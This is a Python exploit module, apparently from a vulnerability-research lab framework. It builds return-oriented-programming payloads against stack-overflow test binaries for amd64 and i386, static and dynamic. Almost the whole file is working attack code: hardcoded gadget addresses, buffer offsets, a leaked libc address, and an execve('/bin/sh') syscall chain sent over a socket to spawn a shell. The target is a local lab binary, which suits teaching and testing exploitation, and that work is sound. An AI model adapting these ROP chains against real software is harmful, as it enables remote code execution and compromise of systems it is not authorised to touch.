#! /usr/bin/python
#coding:utf-8
import os
import socket
import sys
sys.path.append(os.path.abspath("../.."))
from modules import exploit
from pwnlib.elf import ELF
from pwnlib.util.packing import *


class Exploit(exploit.VRL_Exploit):
    def __init__(self):
        '''Add information of your exploit here'''
        self.name = 'rop'
        self.payload_info = 'DEP ALSR ON'
        self.info = '''Exploit Name : rop
Exploit abstract : Rop,a technique by which an attacker can induce arbi-trary behavior in a program
                   whose control ow he has diverted|without injecting any code. A return-oriented program
                   chains together short instruction sequences already present in a program's address space,
                   each of which ends in a "return" instruction.
Author : guoyingjie
Support change payload : false'''
        self.property = {'ret1':0x0000000000021102, # gadget address in libc
                         'ret2':0x000000000008ae95,
                         'ret3':0x000000000003a718, 
                         'ret4':0x0000000000114809,
                         'ret5':0x00000000000bb945, 
                         'data1':0x000000000000003b,#execv systemcall number
                         'data2':0x0000000000000000,
                         'data3':0x0000000000000000,
                         'offset':40, # offset
                         'sysaddress':0x0} # system function address, initialize 0
        self.options={'dIP' : '127.0.0.1',
                      'port':'34567',
                      'allow_stack_exec' : 'False',
                      'static' : 'False',
                      'architecture' : 'amd64',
                      'aslr' : 'on'
                      }
        self.vulnerability= 'vulnerabilities/stack_overflow/code_reuse'

    def run(self):
     if self.options['architecture'] == 'amd64':
      if self.options['static'] == 'False':
        '''Run your exploit here, if this script could success, the VRL can run it.
        When the exploit run, follow the options.'''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.options['dIP'], int(self.options['port'])))

        #get new sysaddress here
        s.send("a")        #any string
        recv_data = s.recv(16)
        self.property['sysaddress'] = int(recv_data,16)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        print "sysaddress = " + hex(self.property['sysaddress'])

        #get /bin/sh offset
        binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
        print "binsh_addr_offset = " + hex(binsh_addr_offset)

        #get ret offset
        pop_ret1_offset = self.property['ret1'] - libc.symbols['system']
        pop_ret2_offset = self.property['ret2'] - libc.symbols['system']
        pop_ret3_offset = self.property['ret3'] - libc.symbols['system']
        pop_ret4_offset = self.property['ret4'] - libc.symbols['system']
        pop_ret5_offset = self.property['ret5'] - libc.symbols['system']
       
        #get /bin/sh address
        binsh_addr = self.property['sysaddress'] + binsh_addr_offset

        #get ret address
        pop_ret1_addr = self.property['sysaddress'] + pop_ret1_offset
        pop_ret2_addr = self.property['sysaddress'] + pop_ret2_offset
        pop_ret3_addr = self.property['sysaddress'] + pop_ret3_offset
        pop_ret4_addr = self.property['sysaddress'] + pop_ret4_offset
        pop_ret5_addr = self.property['sysaddress'] + pop_ret5_offset
        #pop_ret5_addr =pop_ret4_addr - 2

        #set payload
        payload = "a"*self.property['offset'] + p64(pop_ret1_addr) + p64(binsh_addr) + p64(pop_ret2_addr) + p64(pop_ret3_addr) + p64(self.property['data1']) + p64(pop_ret4_addr) + p64(self.property['data2']) + p64(self.property['data3']) + p64(pop_ret5_addr)


        print "\n##########sending payload##########\n"
        s.send(payload)
        s.close()
      else:
        self.property = {'ret1':0x0000000000401696, # gadget address in libc
                         'ret2':0x00000000004264af,
                         'ret3':0x00000000004c26e8, 
                         'ret4':0x0000000000442fe9,
                         'ret5':0x0000000000467685, 
                         'data1':0x000000000000003b,#execv systemcall number
                         'data2':0x0000000000000000,
                         'data3':0x0000000000000000,
                         'offset':24, # offset
                         'sysaddress':0x0} # system function address, initialize 0

        self.vulnerability= 'vulnerabilities/stack_overflow/ggteststatic'

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.options['dIP'], int(self.options['port'])))

        
        libc = ELF('../../vulnerabilities/stack_overflow/ggteststatic')

        #get  sysaddress here
        self.property['sysaddress'] = libc.symbols['system']
        print "sysaddress = " + hex(self.property['sysaddress'])


        #get /bin/sh address
        binsh_addr = next(libc.search('/bin/sh'))


        #get ret address
        pop_ret1_addr = self.property['ret1']
        pop_ret2_addr = self.property['ret2']
        pop_ret3_addr = self.property['ret3']
        pop_ret4_addr = self.property['ret4']
        pop_ret5_addr = self.property['ret5']
       
     

        #set payload
        payload = "a"*self.property['offset'] + p64(pop_ret1_addr) + p64(binsh_addr) + p64(pop_ret2_addr) + p64(pop_ret3_addr) + p64(self.property['data1']) + p64(pop_ret4_addr) + p64(self.property['data2']) + p64(self.property['data3']) + p64(pop_ret5_addr)


        print "\n##########sending payload##########\n"
        s.send(payload)
        s.close()
     elif self.options['architecture'] == 'i386':
      self.property = {'ret1':0x00018395, # gadget address in libc  : pop ebx ; ret
                         'ret2':0x0002c5dc,# : xor eax, eax ; ret
                         'ret3':0x00023f97, # : pop eax ; ret
                         'ret4':0x0002baab,# : pop ecx ; pop edx ; ret
                         'ret5':0x00002c87, # : int 0x80
                         'data1':0x0000000b,#execv systemcall number
                         'data2':0x00000000,
                         'data3':0x00000000,
                         'offset':26, # offset
                         'sysaddress':0x0} # system function address, initialize 0
        
      self.vulnerability= 'vulnerabilities/stack_overflow/code_reuse32'

      if self.options['static'] == 'False':
        '''Run your exploit here, if this script could success, the VRL can run it.
        When the exploit run, follow the options.'''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.options['dIP'], int(self.options['port'])))

        #get new sysaddress here
        s.send("a")        #any string
        recv_data = s.recv(8)
        self.property['sysaddress'] = int(recv_data,16)
        libc = ELF('/lib32/libc.so.6')
        print "sysaddress = " + hex(self.property['sysaddress'])

        #get /bin/sh offset
        binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
        print "binsh_addr_offset = " + hex(binsh_addr_offset)

        #get ret offset
        pop_ret1_offset = self.property['ret1'] - libc.symbols['system']
        pop_ret2_offset = self.property['ret2'] - libc.symbols['system']
        pop_ret3_offset = self.property['ret3'] - libc.symbols['system']
        pop_ret4_offset = self.property['ret4'] - libc.symbols['system']
        pop_ret5_offset = self.property['ret5'] - libc.symbols['system']
       
        #get /bin/sh address
        binsh_addr = self.property['sysaddress'] + binsh_addr_offset

        #get ret address
        pop_ret1_addr = self.property['sysaddress'] + pop_ret1_offset
        pop_ret2_addr = self.property['sysaddress'] + pop_ret2_offset
        pop_ret3_addr = self.property['sysaddress'] + pop_ret3_offset
        pop_ret4_addr = self.property['sysaddress'] + pop_ret4_offset
        pop_ret5_addr = self.property['sysaddress'] + pop_ret5_offset
        #pop_ret5_addr =pop_ret4_addr - 2

        #set payload
        payload = "a"*self.property['offset'] + p32(pop_ret1_addr) + p32(binsh_addr) + p32(pop_ret2_addr) + p32(pop_ret3_addr) + p32(self.property['data1']) + p32(pop_ret4_addr) + p32(self.property['data2']) + p32(self.property['data3']) + p32(pop_ret5_addr)


        print "\n##########sending payload##########\n"
        s.send(payload)
        s.close()
      else:
        print 'static'
        self.property = {'ret1':0x080481d1, # : pop ebx ; ret
                         'ret2':0x080494e3,# : xor eax, eax ; ret
                         'ret3':0x080b95b6, # : pop eax ; ret
                         'ret4':0x080e0859,# : pop ecx ; ret
                         'ret5':0x0807079a, # : pop edx ; ret
                         'ret6':0x0806e127, # : int 0x80
                         'data1':0x0000000b,#execv systemcall number
                         'data2':0x00000000,
                         'data3':0x00000000,
                         'offset':22, # offset
                         'sysaddress':0x0} # system function address, initialize 0

        self.vulnerability= 'vulnerabilities/stack_overflow/ggteststatic32'

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.options['dIP'], int(self.options['port'])))

        
        libc = ELF('../../vulnerabilities/stack_overflow/code_reuse32_static')

        #get  sysaddress here
        self.property['sysaddress'] = libc.symbols['system']
        print "sysaddress = " + hex(self.property['sysaddress'])


        #get /bin/sh address
        binsh_addr = next(libc.search('/bin/sh'))


        #get ret address
        pop_ret1_addr = self.property['ret1']
        pop_ret2_addr = self.property['ret2']
        pop_ret3_addr = self.property['ret3']
        pop_ret4_addr = self.property['ret4']
        pop_ret5_addr = self.property['ret5']
        pop_ret6_addr = self.property['ret6']
     

        #set payload
        payload = "a"*self.property['offset'] + p32(pop_ret1_addr) + p32(binsh_addr) + p32(pop_ret2_addr) + p32(pop_ret3_addr) + p32(self.property['data1']) + p32(pop_ret4_addr) + p32(self.property['data2']) + p32(pop_ret5_addr) + p32(self.property['data3']) + p32(pop_ret6_addr)


        print "\n##########sending payload##########\n"
        s.send(payload)
        s.close()
       
     else:
        print 'Unrecognized architecture, stop.'
        return
       

'''Bellowing is default, simply ignore it.'''
if __name__ == "__main__":
    if '__init__.py' not in os.listdir(os.curdir):
        os.mknod('__init__.py')
    exp = Exploit()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.check():
        print 'Running:\n'
        exp.run()
